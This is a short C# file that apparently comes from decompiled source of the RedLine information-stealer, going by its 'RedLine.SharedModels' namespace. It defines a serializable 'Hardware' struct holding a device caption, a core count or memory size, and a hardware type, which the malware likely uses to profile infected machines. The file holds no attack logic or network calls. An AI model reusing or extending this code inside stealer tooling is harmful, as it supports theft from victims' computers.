using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity3", Namespace = "Entity")]
[ProtoContract(Name = "Hardware")]
public struct Hardware
{
	[ProtoMember(1, Name = "Caption")]
	[DataMember(Name = "Id1")]
	public string Caption { get; set; }

	[ProtoMember(2, Name = "Parameter")]
	[DataMember(Name = "Id2")]
	public string Parameter { get; set; }

	[DataMember(Name = "Id3")]
	[ProtoMember(3, Name = "HardType")]
	public HardwareType HardType { get; set; }

	public override string ToString()
	{
		return "Name: " + Caption + "," + ((HardType == HardwareType.Id1) ? (" " + Parameter + " Cores") : (" " + Parameter + " bytes"));
	}
}
